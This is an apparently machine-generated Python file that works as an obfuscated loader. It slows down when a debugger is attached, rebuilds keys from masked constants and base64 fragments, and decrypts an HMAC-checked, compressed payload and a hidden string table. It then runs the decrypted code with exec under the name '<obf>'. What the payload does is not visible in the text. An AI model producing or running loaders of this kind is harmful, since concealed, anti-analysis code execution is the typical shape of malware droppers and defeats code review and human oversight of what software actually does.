import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_dbf1b9_0 = 'RdK8lRIxKgJzHCz1KElxCbIaZHGEVO9p'
_dbf1b9_1 = 'Y6irMPjyvqRhBZGRBPOeyf9axQ+j'
_dbf1b9_2 = 'C3EaZy3lugamYr27VA=='
_pls = [_dbf1b9_0, _dbf1b9_1, _dbf1b9_2]
_c7c8b4 = [(26217,35553,2),(46203,327,2),(37246,63942,2),(47601,6991,2),(13618,34886,2),(37401,5570,2),(18093,55726,2),(63236,65189,2),(23168,2350,2),(51629,47637,2),(54580,8900,2),(20029,7744,2),(33656,31774,2),(59960,36929,2),(20384,29197,2),(18136,58172,2),(0,0,0),(0,0,0)]
_13cd82 = '7Ii1PA=='
_f795ec = 'yjbgqJ+H+yu55Ecg'
_ec536e = 'w5SLILUbRQw='
_a7bb9e = [0, 1, 2]
_salt = base64.b64decode(_ec536e)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _a7bb9e
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_8412f0 = base64.b64decode(_assembled)
_8b61d0 = 32
_106031 = _8412f0[:-_8b61d0]
_8b61d0 = _8412f0[-_8b61d0:]
_5e66ff = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_c7c8b4)
_hdr = base64.b64decode(_13cd82)
_nonce = base64.b64decode(_f795ec)
_km_seed = hashlib.sha256(_5e66ff + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _106031, hashlib.sha256).digest()
if _calc_tag != _8b61d0:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_106031)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_106031, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_f2eb16'] = mmap
globals()['_9d8823'] = lambda i: globals()['_f2eb16'][str(i)]
_x = globals()['_9d8823']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
